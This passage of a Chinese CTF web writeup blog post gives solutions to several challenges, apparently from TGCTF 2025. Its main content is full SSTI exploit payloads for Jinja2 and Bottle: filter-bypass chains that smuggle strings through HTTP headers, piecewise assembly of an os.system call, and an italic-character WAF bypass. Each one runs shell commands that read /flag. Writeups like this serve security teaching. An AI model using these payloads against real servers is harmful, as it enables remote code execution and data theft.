+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="ln"> 1</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(lip=a|attr(request.mimetype)))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Content-Type: lipsum
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Connection: close
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(gl=a.lip|attr(request.mimetype)))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Content-Type: __globals__
+</span></span><span class="line"><span class="ln">10</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln">11</span><span class="cl">Connection: close
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(get=request.mimetype))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln">14</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln">15</span><span class="cl">Content-Type: __getitem__
+</span></span><span class="line"><span class="ln">16</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln">17</span><span class="cl">Connection: close
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(bui=request.mimetype))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln">20</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln">21</span><span class="cl">Content-Type: __builtins__
+</span></span><span class="line"><span class="ln">22</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln">23</span><span class="cl">Connection: close
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(ev=request.mimetype))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln">26</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln">27</span><span class="cl">Content-Type: eval
+</span></span><span class="line"><span class="ln">28</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln">29</span><span class="cl">Connection: close
+</span></span><span class="line"><span class="ln">30</span><span class="cl">
+</span></span><span class="line"><span class="ln">31</span><span class="cl">GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.glb|attr(a.get)(a.bui)|attr(a.get)(a.ev)(request.mimetype))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln">32</span><span class="cl">Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
+</span></span><span class="line"><span class="ln">33</span><span class="cl">Content-Type: __import__(&#39;os&#39;).popen(&#39;mkdir static;cat /flag_h3r3 &gt; static/flag&#39;).read()
+</span></span><span class="line"><span class="ln">34</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="ln">35</span><span class="cl">Connection: close
+</span></span></code></pre></div><p>访问/static/flag拿到flag</p>
+<p>‍</p>
+<h3 id="now-you-see-me-2"><strong>Now you see me 2</strong><a hidden class="anchor" aria-hidden="true" href="#now-you-see-me-2">#</a></h3>
+<p>这题跟上题打法一样，只是更换了传参的方式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="ln">1</span><span class="cl">GET /H3dden_route?spell=fly-%23}{%set%09a=config%}{%print(a.update(clss=a|attr(request.range.units)))%}{%23 HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: 127.0.0.1:5000
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Range: __class__=100-200
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Connection: close
+</span></span></code></pre></div><p>拿到一张图片，用<a href="https://tools.jb51.net/aideddesign/img_add_info">在线解密</a>提取图片隐藏信息，无需密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="n">__M</span><span class="nd">@g1c1@ans_M@stering_M@g1c__</span><span class="p">}</span>
+</span></span></code></pre></div><p>‍</p>
+<h3 id="出题人已疯">出题人已疯<a hidden class="anchor" aria-hidden="true" href="#出题人已疯">#</a></h3>
+<p>题目源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s1">@File    :   app.py
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s1">@Time    :   2025/03/29 15:52:17
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s1">@Author  :   LamentXU 
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">bottle</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s1">flag in /flag
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello, World!&#39;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/attack&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">25</span> <span class="ow">and</span> <span class="s1">&#39;open&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">and</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="n">bottle</span><span class="o">.</span><span class="n">template</span><span class="p">(</span><span class="s1">&#39;hello &#39;</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">bottle</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Invalid payload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">bottle</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></div><p>用 import 加载模块，然后修改属性去实现变量持久化，从而去 RCE，然后可以用模板函数 include 去读文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;__imp&#39;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;ort__&#39;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;(&#34;os&#34;&#39;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;).sys&#39;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;tem(&#34;&#39;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;ca&#39;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;t+/f*&#39;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;&gt;1&#34;)&#39;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">b</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">import</span><span class="o">+</span><span class="n">os</span><span class="p">;</span><span class="n">exec</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span><span class="nb">eval</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="n">include</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>‍</p>
+<h3 id="ez_"><strong>ez_puzzle</strong><a hidden class="anchor" aria-hidden="true" href="#ez_">#</a></h3>
+<h4 id="非预期">非预期<a hidden class="anchor" aria-hidden="true" href="#非预期">#</a></h4>
+<p>查看puzzle.js，看到有一大段base64</p>
+<p><img alt="image" loading="lazy" src="assets/image-20250407010141-zyhi1kf.png"></p>
+<p>cyberchef转换一下</p>
+<p><img alt="image" loading="lazy" src="assets/image-20250407002109-6kytcop.png"></p>
+<p>发现是zlib</p>
+<p><img alt="image" loading="lazy" src="assets/image-20250407002221-409o1nm.png"></p>
+<p>看到一串hex</p>
+<p>反转一下转字符串就能拿到flag</p>
+<p><img alt="image" loading="lazy" src="assets/image-20250407002351-jsv6pho.png"></p>
+<h4 id="预期解">预期解<a hidden class="anchor" aria-hidden="true" href="#预期解">#</a></h4>
+<p><img alt="image-20250418143438792" loading="lazy" src="../assets/image-20250418143438792.png"></p>
+<p>这题打开控制台会触发反调试</p>
+<p>右键从忽略列表中移除即可</p>
+<p><img alt="image-20250418143550982" loading="lazy" src="../assets/image-20250418143550982.png"></p>
+<p>在代码中可以找到startTime和endTime，猜测应该是endTime-startTime来判断时间，所以直接在控制台给startTime赋一个大值</p>
+<pre tabindex="0"><code>startTime=66666666666666
+</code></pre><p>然后把拼图拼好即可拿到flag</p>
+<h3 id="出题人又疯复现">出题人又疯(复现)<a hidden class="anchor" aria-hidden="true" href="#出题人又疯复现">#</a></h3>
+<p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园</a></p>
+<p><img alt="image-20250418141321411" loading="lazy" src="../assets/image-20250418141321411.png"></p>
+<p>这题主要是由于bottle框架中对编码检查的不严谨，所以可以利用python中会将exec执行的代码中的斜体字转换为对应的ASCII字符的特性来绕过waf。但是由于url编码问题，题目环境中只有o和a能够成功。</p>
+<p><img alt="image-20250418142516624" loading="lazy" src="../assets/image-20250418142516624.png"></p>
+<p>详细的得看lamentxu师傅的博客。</p>
+<p>所以这题我们就可以把</p>
+<pre tabindex="0"><code>&#39;o&#39;替换为&#39;%ba&#39;,
+&#39;a&#39;替换为&#39;%aa&#39;,
+</code></pre><p>payload</p>
+<pre tabindex="0"><code>{{open(&#39;/flag&#39;).read()}}
+替换
+{\{%bapen(&#39;/flag&#39;).read()}}  //这里的&#34;\&#34;是防止hugo报错加的，实际不需要
+</code></pre><p><img alt="image-20250418142714072" loading="lazy" src="../assets/image-20250418142714072.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/post/tgctf_2025/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>TGCTF-2025-Web-Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>春秋云镜-Exchange-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
